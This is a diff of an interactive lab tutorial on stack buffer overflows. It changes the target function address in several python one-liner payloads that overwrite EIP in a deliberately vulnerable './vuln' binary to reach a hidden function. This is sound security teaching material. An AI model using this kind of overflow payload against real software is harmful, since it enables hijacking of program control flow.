@@ -7,22 +7,22 @@
 ## python exploitation:
 
 As a reminder:
-- the secretHiddenFunction address is `\xce\x92\x04\x08` in python
+- the secretHiddenFunction address is `\xd7\x92\x04\x08` in python
 - The payload is `./vuln AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE` with EEEE to be replaced by the above address.
 
 In python2 we can generate a payload with:
 
-`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"`{{execute}}
+`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')"`{{execute}}
 
 The 28 characters are called the offset and could be any character. The next 4 bytes are used to overwrite the EIP and must point to the function we want to execute.
 
 Let's try the exploit:
 
-`./vuln \`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"\``{{execute}}
+`./vuln \`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')"\``{{execute}}
 
 or 
 
-`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')")`{{execute}}
+`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xd7\x92\x04\x08')")`{{execute}}
 
 Et voila! we have successfully reached a piece of code which is never called, and we no longer have any segmentation fault. Which means that the signal handler is not a strong mitigation.
 
@@ -49,5 +49,5 @@ Recompile:
 
 `dmesg | tail -2`{{execute}}
 
-`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + '\xce\x92\x04\x08')")`{{execute}}
+`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + '\xd7\x92\x04\x08')")`{{execute}}
 
